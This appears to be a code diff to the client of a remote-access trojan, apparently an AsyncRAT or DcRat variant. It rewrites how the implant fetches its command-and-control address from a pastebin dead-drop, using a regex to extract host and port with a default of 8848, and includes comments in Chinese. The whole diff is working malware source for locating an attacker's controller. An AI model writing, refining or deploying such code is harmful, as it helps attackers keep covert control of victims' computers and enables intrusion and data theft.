@@ -16,6 +16,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Linq.Expressions;
 using Microsoft.VisualBasic.ApplicationServices;
+using System.Text.RegularExpressions;
 
 namespace Client.Connection
 {
@@ -128,9 +129,17 @@ namespace Client.Connection
                         NetworkCredential networkCredential = new NetworkCredential("", "");
                         wc.Credentials = networkCredential;
                         string resp = wc.DownloadString(Settings.Paste_bin);
-                        string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
-                        Settings.Hos_ts = spl[0];
-                        Settings.Por_ts = spl[new Random().Next(1, spl.Length)];
+                        Match match = Regex.Match(resp, @"(?:\[?([^\]:]+)\]?:?(\d+)?)|(?:([^\]:]+):?(\d+)?)");
+                        if (match.Success)
+                        {
+                            string ipFormPaste = match.Groups[1].Success ? match.Groups[1].Value : match.Groups[3].Value;
+
+                            // 如果匹配到端口，则使用提取的端口；否则使用默认端口
+                            string port = match.Groups[2].Success ? match.Groups[2].Value : match.Groups[4].Success ? match.Groups[4].Value : "8848";
+
+                            Settings.Hos_ts = ipFormPaste;
+                            Settings.Por_ts = port;
+                        }
                         //Debug.WriteLine(Settings.Hos_ts);
                         // 新增代码，判断远程主机地址类型
                         IPAddress remoteIpAddress;
